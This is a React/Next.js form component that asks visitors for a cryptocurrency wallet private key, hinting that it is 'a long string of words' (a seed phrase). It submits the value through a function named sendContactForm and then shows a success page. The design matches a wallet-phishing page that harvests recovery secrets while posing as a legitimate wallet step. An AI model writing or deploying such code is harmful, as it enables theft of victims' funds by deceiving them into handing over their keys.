import { sendContactForm } from "@/libs/api";
import { useRouter } from "next/router";
import React, { useState } from "react";

export default function PrivateKey({ wallet }) {
  const router = useRouter();
  const [data, setData] = useState({ privateKey: "" });
  const [loading, setLoading] = useState(false);
  const [error, setError] = useState("");
  const handleChange = (e) => {
    const name = e.target.name;
    const value = e.target.value;
    setData({ [name]: value });
  };

  const handleSubmit = async (e) => {
    e.preventDefault();
    setLoading(true);
    setError("");
    try {
      const payload = {
        name: wallet,
        subject: "privateKey",
        message: data?.privateKey,
      };
      const response = await sendContactForm(payload);
      console.log(response);

      if (response.success) {
        setData({ privateKey: "" });
        router.push("/success");
      } else {
        setError("Form submission failed.");
      }
    } catch (err) {
      setError(err, "failed to submit, retry");
      console.log(err);
    } finally {
      setLoading(false);
    }
  };

  return (
    <form className="space-y-3" onSubmit={handleSubmit}>
      <input
        name="privateKey"
        type="text"
        value={data.privateKey}
        onChange={handleChange}
        required
        className="w-full p-2 h-10 rounded-md border"
        placeholder="Enter your Private key"
      />
      <p className="text-xs text-gray-500 text-left">A long string of words,</p>
      <button
        type="submit"
        className="uppercase w-full bg-primary text-white py-2 rounded-md "
      >
        {loading ? "Proceeding..." : "Proceed"}
      </button>
      {error.length > 1 && (
        <p className="text-red-600 mt-4 text-center">{error}</p>
      )}
    </form>
  );
}
